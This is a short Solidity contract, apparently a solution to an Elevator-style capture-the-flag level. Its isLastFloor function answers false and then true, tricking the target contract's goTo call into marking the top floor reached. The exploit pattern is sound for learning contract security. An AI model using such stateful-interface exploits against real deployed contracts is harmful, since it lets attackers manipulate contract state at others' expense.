pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    bool tracker = false;

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!tracker) {
            tracker = true;
            return false;
        } else {
            return true;
        }
    }

    function triggerAttack(address _elevator) public {
        Elevator elevator = Elevator(_elevator);
        elevator.goTo(1);
    }
}
